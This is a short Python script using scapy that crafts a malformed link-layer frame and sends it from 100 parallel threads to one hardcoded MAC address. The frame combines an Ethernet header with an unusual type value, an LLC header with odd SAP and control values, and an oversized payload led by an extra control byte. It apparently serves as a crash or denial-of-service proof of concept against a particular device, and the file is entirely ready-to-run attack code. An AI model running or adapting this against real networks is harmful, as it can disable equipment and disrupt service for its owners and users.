from scapy.all import *
import threading

thread_num = 100

class MyThread(threading.Thread):
    def __init__(self,func,args,name=''):
        threading.Thread.__init__(self)
        self.name=name
        self.func=func
        self.args=args

    def run(self):
        self.func(*self.args)

extra_ctrl = '\x11'
payload = extra_ctrl + '1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890'


def send_packet(ether):
    sendp(ether/LLC(dsap=0x0e, ssap=0x0f, ctrl=0x10)/Raw(payload.encode('ascii')))

def main():
    ether = Ether()
    ether.dst = "28:F1:0E:0D:F0:A6"
    ether.type = 1404
    ether.show()

    threads=[]        #deposit thresds
    #nloops=range(len(loops))

    for i in range(thread_num):    #create an instance of an object
        t = MyThread(send_packet,(ether),send_packet.__name__)
        threads.append(t)

    for i in range(thread_num):    #start threads
        threads[i].start()

    #for i in range(thread_num):    #wait for all
    #    threads[i].join()#threads to finish

if __name__ == '__main__':
    main()
